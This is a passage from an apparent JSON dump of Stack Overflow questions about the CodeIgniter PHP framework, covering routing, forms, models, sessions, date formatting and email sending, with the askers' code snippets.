$this-&gt;facebook-&gt;getUser();\n\nif($user){\n\n    try {\n\n        $user_profile = $this-&gt;facebook-&gt;api('/me');\n\n    } catch (FacebookApiException $e){\n\n        error_log($e);\n        $user = null;\n\n    }\n\n}\n\nif($user){\n\n    $article = $this-&gt;article-&gt;fetch_article($article_id);\n    $config = array(\n        'message' =&gt; 'I just read an '.anchor('articles/'.url_title($article['title']).'/'.$article_id, 'article').' on '.anchor('', 'TrackTheOutbreak.com').'!',\n\n    );\n\n    $this-&gt;facebook-&gt;api('/me/feed', 'post', $config);\n\n} else {\n\n    $data['MESSAGE_TITLE'] = 'Authentication Error';\n    $data['MESSAGE_TEXT'] = 'You must be logged into an existing Facebook account to use this feature.  Click '.anchor($this-&gt;facebook-&gt;getLoginUrl(), 'here').' to login.';\n    $this-&gt;parser-&gt;parse('error_body.tpl', $data);\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p></code></p>\n"},{"tags":["codeigniter","tinymce"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12721865,"title":"tinyMCE image output","body":"<p>i'm using TinyMCE for custom insert image, the problem is when i insert image with advimage, example</p>\n\n<pre><code>http://mysite/folder/image.jpg\n</code></pre>\n\n<p>but the image link when it loads become</p>\n\n<pre><code>&lt;img title=\"\" src=\"../../image.jpg\" alt=\" \" width=\"450\" height=\"581\" /&gt;\n</code></pre>\n\n<p>how can i get the output to become like</p>\n\n<pre><code>&lt;img title=\"\" src=\"http://mysite/folder/image.jpg\" alt=\" \" width=\"450\" height=\"581\" /&gt;\n</code></pre>\n\n<p>sorry for my bad english</p>\n\n<p>thank you</p>\n"},{"tags":["arrays","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12714546,"title":"Codeigniter - How data list with multiple tables","body":"<p>i have two tables of database\n1st table is: Products\n*id\n*brand\n*model</p>\n\n<p>2nd table is:  Sales\n*id\n*pid\n*date</p>\n\n<p>i want to create list with getting data form both tables.</p>\n\n<p><em><strong>here is my Model:</em></strong></p>\n\n<pre><code>class Sales_model extends CI_Model {\n    function getAll() {\n\n\n        $q = $this-&gt;db-&gt;get('sales');\n        foreach ($q-&gt;result() as $row) {    \n            $data[] = $row;\n\n            $q2 = $this-&gt;db-&gt;get_where('products', array('id' =&gt; $row-&gt;pid));\n\n            foreach ($q2-&gt;result() as $row2) {\n                $data[] = $row2;\n            }\n\n        }\n        return $data;\n}\n</code></pre>\n\n<p>-------- and here is controller code ------------</p>\n\n<pre><code>class Sales extends CI_Controller {\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function index()\n    {\n        $this-&gt;load-&gt;model('sales_model');\n\n        $data['q'] = $this-&gt;sales_model-&gt;getAll();\n\n        $this-&gt;load-&gt;view('sales', $data);\n    }\n}\n</code></pre>\n\n<p>-------------------- here is my view code ----------------</p>\n\n<pre><code>&lt;?php foreach($q as $row) : ?&gt;\n    &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo $row-&gt;id; ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php $date = new DateTime(\"@$row-&gt;date\"); echo $date-&gt;format('D M d, Y'); ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo $row-&gt;brand; ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo $row-&gt;model; ?&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;?php endforeach; ?&gt;\n</code></pre>\n\n<hr>\n\n<p>anybody help me, i want to get date from sales table and products detail who add in sales table.\nThanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":351,"score":0,"question_id":10996096,"title":"How to set custom error handler in Codeigniter to Email errors","body":"<p>I'm fairly new to PHP and the setting of custom error handlers, but I have some code which works fine outside of CI but I can't work out how to integrate this into a CI Controller. I get an error \"Message: Undefined property: Errors::$my_error_handler\"</p>\n\n<p>My Controller is:</p>\n\n<pre><code>&lt;?php\nclass Errors extends CI_Controller {\n\n\n    public function __construct()\n    {\n        parent::__construct();\n\n    }\n\n    function my_error_handler($number, $message, $file, $line, $vars)\n    {\n        $email = \"\n            &lt;p&gt;An error ($number) occurred on line\n            &lt;strong&gt;$line&lt;/strong&gt; and in the &lt;strong&gt;file: $file.&lt;/strong&gt;\n            &lt;p&gt; $message &lt;/p&gt;\";\n\n        $email .= \"&lt;pre&gt;\" . print_r($vars, 1) . \"&lt;/pre&gt;\";\n\n        $headers = 'Content-type: text/html; charset=iso-8859-1' . \"\\r\\n\";\n\n        // Email the error to someone...\n        error_log($email, 1, 'name@domain.com', $headers);\n\n        // Make sure that you decide how to respond to errors (on the user's side)\n        // Either echo an error message, or kill the entire project. Up to you...\n        // The code below ensures that we only \"die\" if the error was more than\n        // just a NOTICE.\n        if ( ($number !== E_NOTICE) &amp;&amp; ($number &lt; 2048) ) {\n            die(\"There was an error. Please try again later.\");\n        }\n    }\n\n\n    function test()\n    {\n        // We should use our custom function to handle errors.\n        set_error_handler($this-&gt;my_error_handler);\n\n        // Trigger an error... (var doesn't exist)\n        echo $somevarthatdoesnotexist;\n\n    }\n\n}\n?&gt;\n</code></pre>\n\n<p>If there is a better way to email error messages using CI please let me know.</p>\n"},{"tags":["php","json","codeigniter","foreach","associative-array"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":104,"score":0,"question_id":12683221,"title":"Codeigniter $query->result() loop to associative array","body":"<p>I'm having trouble getting this loop to return all of the rows that I know mysql is generating in this query.  The objects in my javascript console are returning as I would like them to; however, I'm only getting the last row from each unique <code>$row-&gt;student_id</code>.  I can tell that each unique <code>row-&gt;student_id</code> is being overwritten by the previous, but I'm not sure how else to do this logic.  </p>\n\n<p>This is part of a Codeigniter model.  My controller is performing a json_encode function on this function, then I'm pulling this data into my view with jQuery <code>$.ajax</code> wired to a handlebars.js template.  I'm aware that I could use ember for data bindings, but that is beyond my expertise at this time.</p>\n\n<pre><code>$query = $this-&gt;db-&gt;get();\n    if ($query-&gt;num_rows() &gt; 0) {\n\n        $prev = null;\n        foreach ($query-&gt;result() as $row) {\n\n            if ($prev != $row-&gt;student_id) {\n                $data[$row-&gt;student_id] = array(\n                    'first' =&gt; $row-&gt;last_name,\n                    'last' =&gt; $row-&gt;first_name);\n                $data[$row-&gt;student_id]['dorc'] = array($row-&gt;debit_or_credit);\n                $prev = $row-&gt;student_id;\n            } else {\n                $data[$row-&gt;student_id]['dorc'][] += $row-&gt;debit_or_credit;\n\n            }\n        }\n\n        return $data;\n    } else {\n        return array();\n    }`\n</code></pre>\n"},{"tags":["php","codeigniter","routing","hmvc","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":12446377,"title":"routes.php file not loading when using hmvc in codeigniter?","body":"<p>I have hmvc setup and working fine,</p>\n\n<p>I have a gallery module.</p>\n\n<p>The gallery module breaks down into three controllers and it's structure is as follows:</p>\n\n<pre><code>/modules/gallery/\n/modules/gallery/config/\n/modules/gallery/helpers/\n/modules/gallery/controllers/\n/modules/gallery/controllers/gallery.php\n/modules/gallery/controllers/galleries.php\n/modules/gallery/controllers/images.php\n/modules/gallery/models/\n/modules/gallery/models/galleriesmodel.php\n/modules/gallery/models/imagesmodel.php\n/modules/gallery/views/dashboard.tpl\n/modules/gallery/views/galleries/dashboard.tpl\n/modules/gallery/views/images/dashboard.tpl\n</code></pre>\n\n<p>anyway, I have a function inside my <code>images.php</code> controller called <code>list_items</code></p>\n\n<p>So I want to map the url<br>\n<a href=\"http://example.com/gallery/images/list\" rel=\"nofollow\">http://example.com/gallery/images/list</a> to<br>\n<a href=\"http://example.com/gallery/images/list_items\" rel=\"nofollow\">http://example.com/gallery/images/list_items</a></p>\n\n<p>So I thought, sweet as,\nI will just add a <code>/modules/gallery/config/routes.php</code> with the route inside it.</p>\n\n<p>But it seems the routes are not being included.</p>\n\n<p>The routes from <code>/application/config/routes.php</code> are included and if I put a <code>die('loaded')</code> in the module <code>routes.php</code> the it does kill the script,</p>\n\n<p>But running</p>\n\n<p><code>print_r($this-&gt;router)</code> from one of the controllers does not show up any of the routes from the module <code>routes.php</code>.</p>\n\n<p>What's going on here?</p>\n"},{"tags":["php","forms","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":12694973,"title":"How do I separate two validation forms on one view?","body":"<p>I have a log-in form and a create member form on ONE view on my site in CodeIgniter. </p>\n\n<p>The problem is that when I submit the form with an error (press submit with empty fields for the password and email on the LOGIN form), it triggers the email and password fields in the create member form and vice versa.</p>\n\n<p>I have given them different submit button names and still can't get them to separate.</p>\n\n<p>I have tried renaming fields,however I am confused on which values to rename as I have to submit specific values to my database.</p>\n\n<p>Here is create member form and controller:  </p>\n\n<pre><code>&lt;?php\n\n            echo form_open('auth/create_member');\n\n            echo form_label('',  'email', array('type'=&gt;'text'));\n            $data = array( 'name' =&gt; 'first_name', 'class' =&gt; 'input', 'placeholder' =&gt; 'First Name' );\n            echo form_input($data, set_value('first_name'));\n            echo \"&lt;span class='errors'&gt;\";\n            echo form_error('first_name');\n            echo \"&lt;/span&gt;\";\n\n            echo form_label('',  'last_name', array('type'=&gt;'text'));\n            $data = array( 'name' =&gt; 'last_name', 'class' =&gt; 'input', 'placeholder' =&gt; 'Last Name' );\n            echo form_input($data, set_value('last_name'));\n            echo \"&lt;span class='errors'&gt;\";\n            echo form_error('last_name');\n            echo \"&lt;/span&gt;\";\n\n            echo form_label('',  'email', array('type'=&gt;'text'));\n            $data = array( 'name' =&gt; 'email', 'class' =&gt; 'input', 'placeholder' =&gt; 'Email' );\n            echo form_input($data, set_value('email'));\n            echo \"&lt;span class='errors'&gt;\";\n            echo form_error('email');\n            echo \"&lt;/span&gt;\";\n\n            echo form_label('',  'password', array('type'=&gt;'password'));\n            $data = array( 'name' =&gt; 'password', 'class' =&gt; 'password', 'size' =&gt; 30, 'placeholder' =&gt; 'Password'  );\n            echo form_password($data, set_value('sha1(password)'));\n            echo \"&lt;span class='errors'&gt;\";\n            echo form_error('password');\n            echo \"&lt;/span\";\n\n            echo form_label('',  'password2', array('type'=&gt;'password'));\n            $data = array( 'name' =&gt; 'password2', 'class' =&gt; 'input', 'size' =&gt; 30, 'placeholder' =&gt; 'Confirm Password'  );\n            echo form_password($data, set_value('sha1(password2)'));\n            echo \"&lt;span class='errors'&gt;\";\n            echo form_error('password2');\n            echo \"&lt;/span&gt;\";\n\n            echo form_submit('submit', 'Submit');\n            echo form_close();\n            ?&gt;\n\nfunction create_member() \n    {\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;form_validation-&gt;set_rules('first_name', 'First Name', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('last_name', 'Last Name', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email|is_unique[users.email]');\n        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required'); \n        $this-&gt;form_validation-&gt;set_rules('password2', 'Confirm Password', 'trim|required|matches[password]');\n\n        if($this-&gt;form_validation-&gt;run() == FALSE)\n        {\n            $data['main_content'] = 'home/home_page';\n            $this-&gt;load-&gt;view('includes/templates/home_page_template', $data);\n        }\n        else \n        {\n            $this-&gt;load-&gt;model('user_model');\n            if($query = $this-&gt;user_model-&gt;create_member())\n            {\n                $this-&gt;load-&gt;model('user_model');\n                $this-&gt;varification_email();\n                $data['main_content'] = 'account/welcome';\n                $this-&gt;load-&gt;view('includes/templates/main_page_template', $data);\n\n            }\n            else\n            {\n                $this-&gt;load-&gt;view('home/home_page');\n            }\n        }\n    }\n</code></pre>\n\n<p>and here is the login form and controller:</p>\n\n<pre><code>&lt;?php\n\n                echo form_open('auth/validate_credentials_login');\n\n                echo \"&lt;span class='errors_login'&gt;\";\n                echo form_error('email');\n                echo \"&lt;/span&gt;\";\n\n                echo form_label('',  'email',  array('type'=&gt;'text'));\n                $data = array( 'name' =&gt; 'email', 'class' =&gt; 'input', 'placeholder' =&gt; 'Email');\n                echo form_input($data, set_value('email'));\n\n\n                echo \"&lt;span class='errors_login'&gt;\";\n                echo form_error('password');\n                echo \"&lt;/span&gt;\";\n\n                echo form_label('',  'password', array('type'=&gt;'password'));\n                $data = array( 'name' =&gt; 'password', 'class' =&gt; 'input', 'placeholder' =&gt; 'Password');\n                echo form_password($data, set_value('sha1(password)'));\n\n                echo form_submit('submit_login', 'Login');\n                echo form_close();\n\n                ?&gt;      \n\nfunction validate_credentials_login()\n   {\n        // WHEN THE VIEW IS LOADED THIS FUNCTION IS CALLED AND LOADS MODEL AS WELL AS DEFINES THE SALT VARIABLE AND LOADS THE ENCRYPTING HELPER LIBRARY\n\n        $this-&gt;load-&gt;library('encrypt');\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email');\n        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required');\n        $this-&gt;load-&gt;library('session');\n        $this-&gt;load-&gt;model('user_model', 'um');\n        $login = $this-&gt;input-&gt;post('submit_login');\n\n\n\n\n\n   if($login) {\n                $user = $this-&gt;um-&gt;validate_home_login(array('email' =&gt; $this-&gt;input-&gt;post('email')));\n                if( $user ) {\n\n                    // CHECK THE USER'S PASSWORD AGAINST THE ONE FROM THE LOGIN FORM\n                    if($user-&gt;password == $this-&gt;encrypt-&gt;sha1( $user-&gt;salt . $this-&gt;encrypt-&gt;sha1($this-&gt;input-&gt;post('password')))) {\n                        $this-&gt;session-&gt;set_userdata(array(\n                            'email' =&gt; $this-&gt;input-&gt;post('email')\n                        ));\n                        redirect('account/dashboard');\n                        exit;\n                    }\n                }\n            }\n   }\n</code></pre>\n"},{"tags":["javascript","database","query","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12717273,"title":"Code Ignitor displaying one record from database","body":"<p>Can someone please help me with displaying one record from a database. So basically i have a page that has a list of records and a link for each record that says vote. When i click on the vote link for a particular record, I want it to display only that record. How would i do this?</p>\n\n<p>THankyou</p>\n\n<p>My code for displaying all the records in the view is:</p>\n\n<pre><code>&lt;h2&gt;List of all polls in this site:&lt;/h2&gt;\n&lt;?php echo '&lt;table&gt;';?&gt;\n&lt;h3&gt;Title&lt;/h3&gt;\n&lt;?php foreach ($polls as $polls_item): ?&gt;\n\n  &lt;tr&gt;&lt;td&gt;&lt;a href=\"http://studweb.cosc.canterbury.ac.nz/~njp63/365/polls/index.php/user\"&gt;Vote&lt;/a&gt;\n\n&lt;?php \n\n    echo $polls_item['title'] . \"&lt;/td&gt;\";?&gt;\n    &lt;div id=\"main\"&gt;\n        &lt;?php echo \"&lt;td&gt;\" .  $polls_item['text'] . \"&lt;/td&gt;\";\n\n?&gt;\n    &lt;/div&gt;\n   &lt;td&gt;&lt;a href=\"#\"&gt;Delete&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;\n\n\n&lt;?php endforeach ?&gt;\n&lt;?php echo \"&lt;/table&gt;\"; ?&gt;\n</code></pre>\n\n<p>My model:</p>\n\n<p>\n\n<pre><code>public function __construct()\n{\n    $this-&gt;load-&gt;database();\n    $this-&gt;load-&gt;helper('url');\n}\n\npublic function get_polls($slug = FALSE)\n{\n    if ($slug === FALSE)\n    {\n        $query = $this-&gt;db-&gt;get('polls');\n        return $query-&gt;result_array();\n    }\n\n    $query = $this-&gt;db-&gt;get_where('polls', array('slug' =&gt; $slug));\n    return $query-&gt;row_array();\n}\n\npublic function set_polls($title, $text)\n{\n\n    $slug = url_title($this-&gt;input-&gt;post($title), 'dash', TRUE);\n\n    $data = array(\n        //'title' =&gt; $this-&gt;input-&gt;post('title'),\n        //'slug' =&gt; $slug,\n        //'text' =&gt; $this-&gt;input-&gt;post('text')\n\n        'title' =&gt; $title,\n        'slug' =&gt; $slug,\n        'text' =&gt; $text\n    );\n\n    $this-&gt;db-&gt;insert('polls', $data);\n    return $this-&gt;db-&gt;insert_id();\n\n}\n\npublic function set_options($option, $pollid)\n{\n\n    $values = $option;\n\n    foreach ($values as $option){\n\n        $options = array(\n            'option_item' =&gt; $option,\n            'poll_id' =&gt; $pollid\n        );\n        $this-&gt;db-&gt;insert('pollOption', $options);\n    }\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p>My controller:</p>\n\n<pre><code>&lt;?php\n\n// Debugging\nerror_reporting(E_ALL);\nini_set('display_error', '1');\n\nclass User extends CI_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;model('polls_model');\n    }\n\n    public function index()\n    {\n        $data['polls'] = $this-&gt;polls_model-&gt;get_polls();\n        $this-&gt;load-&gt;helper('html');\n        $data['content'] = $this-&gt;load-&gt;view('user/index', $data, TRUE);\n        $data['title'] = 'Polls archive';\n        $this-&gt;load-&gt;view('templates/master', $data);\n\n    }\n\n    public function view($slug)\n    {\n        $data['polls_item'] = $this-&gt;polls_model-&gt;get_polls($slug);\n\n        if (empty($data['polls_item']))\n        {\n            show_404();\n        }\n\n        $this-&gt;load-&gt;helper('html');\n        $data['content'] = $this-&gt;load-&gt;view('user/view', $data, TRUE);\n        $data['title'] = $data['polls_item']['title'];\n        $this-&gt;load-&gt;view('templates/master', $data);\n\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","file-upload","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12718878,"title":"I am using the upload function of codeigniter but how do I attach the image uploaded on the server once I edit that item?","body":"<p>I have been successful in using the <a href=\"http://codeigniter.com/user_guide/libraries/file_uploading.html\" rel=\"nofollow\">File Uploading Library</a> to upload my files on the server (mostly images). </p>\n\n<p>My problem is when I need to update that specific item, I need to browse for photo again. Is there a way I can just attach the image uploaded already in the server to my upload button? I am thinking to make a media page like that of the wordpress but is there any starting point that anyone knows who can point me to? Thanks so much!</p>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1484,"score":1,"question_id":8125274,"title":"How to format a date with CodeIgniter","body":"<p>I'm trying to figure out what I'm doing wrong here. I'm wanting to format the <code>date_published</code> field in my query and I'm getting a <code>t_string syntax error</code> in my IDE.</p>\n\n<pre><code>$this-&gt;db-&gt;select('site_news_articles.article_title, site_news_articles.is_sticky,' date_format('site_news_articles.date_published, 'f jS, Y')');\n</code></pre>\n\n<p>UPDATE: </p>\n\n<pre><code>function getNewsTitles($category_id) {\n    $this-&gt;db-&gt;select('site_news_articles.article_title, site_news_articles.is_sticky');\n    $this-&gt;db-&gt;select(\"DATE_FORMAT(site_news_articles.date_published, '%M %e, %Y') as formatted_date\", TRUE);\n    $this-&gt;db-&gt;from('site_news_articles');\n    $this-&gt;db-&gt;where('site_news_articles.news_category_id', $category_id); \n    $this-&gt;db-&gt;where('site_news_articles.is_approved', 'Yes');\n    $this-&gt;db-&gt;where('site_news_articles.status_id', 1);\n    $this-&gt;db-&gt;order_by('site_news_articles.date_published', 'desc');  \n    $this-&gt;db-&gt;limit(10);\n    $query = $this-&gt;db-&gt;get();\n    return $query-&gt;result_array(); \n}\n</code></pre>\n\n<p>Error Number: 1064</p>\n\n<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'FROM (<code>site_news_articles</code>) WHERE <code>site_news_articles</code>.<code>news_category_id</code> = 2 A' at line 2</p>\n\n<p>SELECT <code>site_news_articles</code>.<code>article_title</code>, <code>site_news_articles</code>.<code>is_sticky</code>, DATE_FORMAT(site_news_articles.date_published, <code>'%M</code> %e, <code>%Y')</code> as formatted_date FROM (<code>site_news_articles</code>) WHERE <code>site_news_articles</code>.<code>news_category_id</code> = 2 AND <code>site_news_articles</code>.<code>is_approved</code> = 'Yes' AND <code>site_news_articles</code>.<code>status_id</code> = 1 ORDER BY <code>site_news_articles</code>.<code>date_published</code> desc LIMIT 10</p>\n\n<p>Filename: /home/xtremer/public_html/models/sitemodel.php</p>\n\n<p>Line Number: 140</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12717526,"title":"admin page in codeigniter","body":"<p>i have created a folder abc in application\\controllers. </p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Acc_controller extends CI_Controller {\n\n\n    public function index()\n    {\n\n        $this-&gt;load-&gt;view('abc/index1');\n\n    }\n}\n</code></pre>\n\n<p>After that i have created files in view\\abc. i named it as index1.php</p>\n\n<pre><code>&lt;li&gt; Mauris risus tellus, sodales quis, sagittis vitae, molestie sed,\nnunc. Fusce ornare, turpis vel rutrum blandit, enim diam aliquet purus,\nvel accumsan risus enim sit amet nisl. Ut fringilla ornare libero. Nunc\nsodales. &lt;/li&gt;\n</code></pre>\n\n<p>the problem is that i am unable to access this file. but when i place the controller file out of abc folder to controller foler then it works. why it doesnot work if i place it in any new folder in controller folder.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12717324,"title":"same models for multiple subdomains and sites","body":"<p>I have multiple sites (some are subdomains, some are other sites) that run off of the same database &amp;&amp; caching.  Currently, each of these projects has a unique controller / view setup but the same models.  I'm running into the problem where I want the same models for each of the sites as keeping them all up to date is a pain.</p>\n\n<p>Question: how would I keep the same models over multiple sites / subdomains when each have their own views / controllers?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12716992,"title":"Error when moving project from Windows to Linux \"mod_fcgid: stderr: PHP Fatal error: Class 'Public_Controller' not found\"","body":"<p>After moving my project from Windows to Linux all I get is a blank page\nWhen I look in the logs I get this error:</p>\n\n<pre><code>[Wed Oct 03 22:59:14 2012] [warn] [client MY.IP.] mod_fcgid: stderr: PHP Fatal error:  Class 'Public_Controller' not found in /home/clients/client13/web32/web/application/modules/welcome/controllers/welcome.php on line 11\n</code></pre>\n\n<p>The server is running Fast-CGI (I've also tried Mod-PHP just in case)</p>\n\n<p>Line 10 to 16 of the file:</p>\n\n<pre><code>class Welcome extends Public_Controller\n{\nfunction Welcome()\n{\nparent::__construct();\n}\n</code></pre>\n"},{"tags":["database","query","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12719517,"title":"Getting ID from database and into the URI","body":"<p>I would like to get the ID of a value from a database and use it to delete an item.\nHeres my code:</p>\n\n<p>This code currently gets a set of records from a database, where each record has links. How can I do this?</p>\n\n<pre><code>&lt;h2&gt;List of all polls in this site:&lt;/h2&gt;\n&lt;?php echo '&lt;table&gt;';?&gt;\n&lt;table border=\"1\"&gt;\n  &lt;tr&gt;\n    &lt;th&gt;Title&lt;/th&gt;\n    &lt;th&gt;Text&lt;/th&gt;    \n\n    &lt;th colspan=\"2\"&gt;Action&lt;/th&gt;        \n  &lt;/tr&gt;\n&lt;?php \nforeach($polls as $polls_item){\n  echo \"&lt;tr&gt;\";\n    echo \"&lt;td&gt;\". $polls_item['title'] .\"&lt;/td&gt;\";\n    echo \"&lt;td&gt;\". $polls_item['text'] .\"&lt;/td&gt;\";\n    echo \"&lt;td&gt;\". anchor('user/vote/'.$polls_item-&gt;id,'Vote') .\"&lt;/td&gt;\";\n    echo \"&lt;td&gt;\". anchor('admin/del/'.$polls_item-&gt;id,'Delete') .\"&lt;/td&gt;\";        \n  echo \"&lt;/tr&gt;\"; \n}\n?&gt;\n\n&lt;?php echo anchor('admin/del/1','Delete'); ?&gt;\n\n&lt;/table&gt;\n</code></pre>\n"},{"tags":["codeigniter","twitter-bootstrap","typeahead"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12719423,"title":"twitter bootstrap and codeigniter not working","body":"<p>I'm want to create an autosuggest field using twitter bootstraps typeahead plugin. here is my current code. It returns 500 Internal Server Error in inspect elements console. I think the problem is in model. Please help me. Thanks in advance.</p>\n\n<h2>view: register</h2>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(function() {\n        $('#office').typeahead({\n            source: function(typeahead, query) {\n                $.ajax({\n                    url: \"&lt;?php echo base_url('main/get_offices'); ?&gt;\",\n                    type: \"post\",\n                    data: \"search=\" + query,\n                    dataType: \"json\",\n                    async: false,\n                    success: function(data) {\n                        typeahead.process(data);\n                    }\n                });\n            }\n        });\n    });\n</code></pre>\n\n<h2>    </h2>\n\n<h2>controller: main</h2>\n\n<pre><code>public function get_offices() {\n    $this-&gt;load-&gt;model('offices');\n\n    $data = $this-&gt;offices-&gt;get();\n\n    echo json_encode($data);\n</code></pre>\n\n<h2>    }</h2>\n\n<h2>model: offices</h2>\n\n<pre><code>public function get() {\n    $office = $this-&gt;input-&gt;post('search');\n\n    $this-&gt;db-&gt;select('name');\n    $this-&gt;db-&gt;from('departments');\n    $this-&gt;db-&gt;like('name', $office);\n    $query = $this-&gt;db-&gt;get();\n\n    $office_array = array();\n    foreach ($query-&gt;result() as $row) {\n        $office_array = $row-&gt;name;\n    }\n    //$data['office'] = $office_array;\n\n    return $office_array;\n}\n</code></pre>\n"},{"tags":["iphone","ios","ipad","codeigniter","nivoslider"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12704229,"title":"nivo slider images are not appearing on ipod/iphone/ipad","body":"<p>I am using nivo slider in my codeigniter application and its working fine in all browsers,\nbut images are not appearing on ipad/ipod n iphone.</p>\n\n<p>I have included 1.4.2.js inside html <code>&lt;head&gt;</code> tag and all images are of .png type.</p>\n"},{"tags":["codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":10285,"score":1,"question_id":4112863,"title":"how to get checkbox values using php code ignitor in Controller","body":"<p>I am new to PHP  code ignitor,</p>\n\n<p>how to get checkbox values using php Code ignitor in Controller.</p>\n\n<p>Here is the Checkboxes, i want to get checkbox values base on name as \"businessType\" in controller using post menthod.</p>\n\n<pre><code>&lt;input type=\"checkbox\"name=\"businessType\" value=\"1\"&gt;\n&lt;input type=\"checkbox\"name=\"businessType\" value=\"2\"&gt;\n&lt;input type=\"checkbox\"name=\"businessType\" value=\"3\"&gt;\n</code></pre>\n\n<p>Please suggest</p>\n\n<p>thanks</p>\n"},{"tags":["php","codeigniter","post"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12711497,"title":"How can a CI controller function receive data from either a form or another function?","body":"<p>In my controller, I've created a function to insert a row to the db. It receives input from a form, and passes it on to the model. Here's a simplified version of that controller function:</p>\n\n<pre><code>function add_row()\n{\n$name = $this-&gt;input-&gt;post('name');\n$type = $this-&gt;input-&gt;post('type');\n$newRow = array (\n        \"name\" =&gt; $name,\n        \"type\" =&gt; $type\n    );\n$this-&gt;places_model-&gt;addRow($newRow)\n}\n</code></pre>\n\n<p>I've also created another function in the controller that does various other things, and ends up with values of those two fields. Now I want to call the same add_row function, from within the controller, but this time pass the two values generated in my other function.</p>\n\n<p>What's the best way to modify the add_row function so that it will be flexible enough to receive either posted values from a form, or passed values from another function in the same controller?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12715147,"title":"How do to set a session from a hidden field?","body":"<p>I have an option to let a person checkout on my page as a guest without logging in. The <code>controller</code> will redirect all checkout submits as follows:</p>\n\n<ul>\n<li>If the user is logged in (check session) <code>session-&gt;userdata</code>. If they are logged in -> <code>redirect('checkout_process')</code> </li>\n<li>If the user is not logged in -> <code>redirect('login')</code> </li>\n</ul>\n\n<p>On the login page their is a button that says <code>checkout as guest</code> How do I pass a session to let the user checkout as a guest without forcing them to login when they click this button?</p>\n"},{"tags":["php","codeigniter","gmail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12714969,"title":"codeigniter Mail to going to Spam any solution","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/371/how-do-you-make-sure-email-you-send-programmatically-is-not-automatically-marked\">How do you make sure email you send programmatically is not automatically marked as spam?</a>  </p>\n</blockquote>\n\n\n\n<p>I am sending using codeigniter email library. i am usimg SMTP PROTOCOL.</p>\n\n<pre><code>    $this-&gt;load-&gt;library('email');\n    $config = array(\n        'mailtype' =&gt; 'html',\n        'protocol' =&gt; 'smtp',\n        'smtp_user' =&gt; 'xxxx@gmail.com',\n        'smtp_pass' =&gt; 'xxxx',\n        'smtp_port' =&gt; '465',\n        'smtp_host' =&gt; 'ssl://smtp.gmail.com',\n        'mail_path' =&gt; 'ssl://smtp.gmail.com'\n        );\n    $this-&gt;email-&gt;initialize($config);\n    $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n        $this-&gt;email-&gt;from(\"xxxx@gmail.com\",\"xxxx\");        \n        $message = \"Dear Admin,&lt;br /&gt;&lt;br /&gt;\";\n    $this-&gt;email-&gt;subject('Notification');\n    $this-&gt;email-&gt;message($message);\n    $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>Email is sending perfectly but its going to spam. I want to 